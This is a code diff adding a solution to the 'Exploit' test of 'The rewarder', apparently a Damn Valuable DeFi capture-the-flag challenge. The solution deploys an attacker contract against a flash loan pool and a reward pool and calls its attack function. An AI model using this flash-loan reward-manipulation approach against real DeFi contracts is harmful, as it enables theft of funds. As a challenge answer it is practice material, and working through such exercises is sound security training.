@@ -66,6 +66,24 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // this.liquidityToken = await DamnValuableTokenFactory.deploy();
+        // this.flashLoanPool = await FlashLoanerPoolFactory.deploy(this.liquidityToken.address);
+
+        // // Set initial token balance of the pool offering flash loans
+        // this.rewarderPool = await TheRewarderPoolFactory.deploy(this.liquidityToken.address);
+        // this.rewardToken = await RewardTokenFactory.attach(await this.rewarderPool.rewardToken());
+        // this.accountingToken = await AccountingTokenFactory.attach(await this.rewarderPool.accToken());
+        const TheRewarderAttackerfactory = await ethers.getContractFactory('TheRewarderPoolAttacker', deployer);
+        const attackerContr = await TheRewarderAttackerfactory.deploy(
+            attacker.address,
+            this.liquidityToken.address,
+            this.flashLoanPool.address,
+            this.rewarderPool.address,
+            this.rewardToken.address,
+            this.accountingToken.address,
+        );
+
+        await attackerContr.connect(attacker).attack(TOKENS_IN_LENDER_POOL);
     });
 
     after(async function () {
